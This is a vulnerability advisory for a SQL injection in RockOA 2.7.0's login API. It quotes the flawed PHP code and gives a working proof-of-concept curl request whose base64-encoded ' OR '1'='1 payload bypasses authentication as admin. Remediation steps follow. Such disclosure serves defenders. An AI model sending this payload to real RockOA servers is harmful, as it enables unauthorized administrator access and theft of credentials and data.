# CVE-2025-63742 Vulnerability Report

## Overview
- **CVE ID**: CVE-2025-63742
- **CWE ID**: CWE-89 (SQL Injection)
- **Affected Software**: Xinhu Rainrock RockOA 2.7.0
- **Vulnerability Type**: SQL Injection

## Vulnerability Details

### Affected Component
- **File**: `webmain/task/api/loginAction.php`
- **Function**: `setwxqyAction()`
- **Vulnerable Parameters**: `shouji`, `userid`

### Root Cause
The `setwxqyAction` function decodes base64-encoded user input (`shouji` and `userid` parameters) and directly concatenates them into SQL queries without proper sanitization or parameterized queries.

### Vulnerable Code

```php
public function setwxqyAction()
{
    $shouji = $this->jm->base64decode($this->get('shouji'));
    $userid = $this->jm->base64decode($this->get('userid'));
    $urs = m('admin')->getone("`mobile`='$shouji' AND `status`=1");
    // ...
    $ors = $obj->getone("`userid`='$userid'");
}
```

The `$shouji` and `$userid` variables are directly interpolated into SQL queries, allowing attackers to inject malicious SQL code.

## Exploitation

### Attack Vector
1. Attacker crafts a SQL injection payload
2. Encodes the payload in base64
3. Sends the encoded payload via the `shouji` parameter
4. The application decodes and executes the malicious SQL

### Proof of Concept

```bash
# Payload: ' OR '1'='1
# Base64 encoded: JyBPUiAnMSc9JzE=

curl "http://TARGET/task.php?m=login|api&a=setwxqy&shouji=JyBPUiAnMSc9JzE=&userid=dGVzdA==&agentid=1&num=test"
```

### Expected Result
The response contains `"success":true` and `"user":"admin"`, indicating successful authentication bypass.

## Impact
- **Confidentiality**: Attackers can extract sensitive data including administrator credentials, password hashes, and database contents
- **Integrity**: Potential for data modification through SQL injection
- **Authentication Bypass**: Attackers can bypass authentication mechanisms

## Verification Result
- **Status**: VULNERABLE
- **Boolean-based SQL Injection**: Confirmed
- **Admin user data extracted**: Yes

## Remediation
1. Use parameterized queries or prepared statements
2. Implement proper input validation and sanitization
3. Apply the principle of least privilege for database accounts
4. Update to a patched version when available
